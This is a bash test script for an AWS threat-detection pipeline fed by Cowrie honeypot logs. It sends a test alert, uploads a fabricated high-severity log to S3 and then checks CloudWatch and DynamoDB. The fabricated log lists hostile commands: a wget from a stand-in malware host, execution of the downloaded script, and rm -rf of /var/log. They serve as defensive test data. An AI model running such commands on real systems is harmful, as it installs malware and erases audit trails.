#!/bin/bash

echo "===== THREAT DETECTION SYSTEM - ENHANCEMENT TESTS ====="
echo ""

# Check if dashboard directory exists, create if not
if [ ! -d "dashboard" ]; then
    echo "Creating dashboard directory..."
    mkdir -p dashboard
fi

# Check if dashboard script exists
if [ ! -f "dashboard/create_dashboard.py" ]; then
    echo "Dashboard script not found. Skipping dashboard creation."
else
    echo "===== CREATING CLOUDWATCH DASHBOARD ====="
    python dashboard/create_dashboard.py
    echo ""
fi

# Check if alarms script exists
if [ ! -f "dashboard/create_alarms.py" ]; then
    echo "Alarms script not found. Skipping alarm creation."
else
    echo "===== CREATING CLOUDWATCH ALARMS ====="
    python dashboard/create_alarms.py
    echo ""
fi

echo "===== TESTING SNS ALERTS ====="
# Test SNS topic directly
echo "Sending test alert to SNS topic..."
aws sns publish \
    --topic-arn arn:aws:sns:us-east-1:609738416112:threat-alerts \
    --message "This is a test alert from the threat detection system.

Event ID: test-manual-$(date +%s)
Timestamp: $(date -u +"%Y-%m-%dT%H:%M:%SZ")
Threat: Test Alert
Score: 90
Source IP: 192.168.1.100

Explanation: This is a manually triggered test alert to verify SNS notification functionality." \
    --subject "Test Alert - Threat Detection System" \
    --region us-east-1 \
    --output text

echo "Test alert sent. Check your email for the notification."
echo ""

echo "===== TESTING HIGH-SEVERITY THREAT DETECTION ====="
# Create a test log with high severity indicators
cat > test_high_severity.json << EOF
{
  "event_id": "test-high-$(date +%s)",
  "timestamp": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")",
  "src_ip": "192.168.1.100",
  "eventid": "cowrie.login.success",
  "username": "root",
  "password": "password123",
  "session": "test-session-1",
  "protocol": "ssh",
  "commands": [
    "wget http://malware.example.com/malware.sh",
    "chmod +x malware.sh",
    "./malware.sh",
    "rm -rf /var/log/*"
  ]
}
EOF

echo "Created test log file: test_high_severity.json"

# Upload to S3 to trigger Lambda
aws s3 cp test_high_severity.json s3://creditcardd/cowrie-logs/high_severity_$(date +%s).json --region us-east-1

echo "Uploaded test log to S3"
echo "Check your email for high-severity alert"
echo "Waiting for Lambda to process..."
sleep 10

echo ""
echo "===== CHECKING CLOUDWATCH LOGS ====="
# Check CloudWatch logs for Lambda execution
aws logs filter-log-events \
    --log-group-name "/aws/lambda/threat-detect-bedrock-dev-threatAnalyzer" \
    --filter-pattern "Generated AI threat analysis" \
    --region us-east-1 \
    --limit 5 \
    --output text

echo ""
echo "===== CHECKING DYNAMODB ====="
# Check DynamoDB for the processed threat
aws dynamodb scan --table-name ThreatsTable --limit 5 --region us-east-1 --output text

echo ""
echo "===== CHECKING CLOUDWATCH METRICS ====="
# Check if CloudWatch metrics exist
aws cloudwatch list-metrics \
    --namespace ThreatDetection \
    --region us-east-1 \
    --output text

echo ""
echo "===== TEST SUMMARY ====="
echo "1. Created CloudWatch dashboard (if script exists)"
echo "2. Created CloudWatch alarms (if script exists)"
echo "3. Sent test SNS alert - check your email"
echo "4. Uploaded test threat log to S3"
echo "5. Checked CloudWatch logs for Lambda execution"
echo "6. Checked DynamoDB for processed threats"
echo "7. Checked CloudWatch metrics"
echo ""
echo "To view the CloudWatch dashboard, visit:"
echo "https://console.aws.amazon.com/cloudwatch/home?region=us-east-1#dashboards:name=ThreatDetectionDashboard"
echo ""
echo "===== END OF TESTS ====="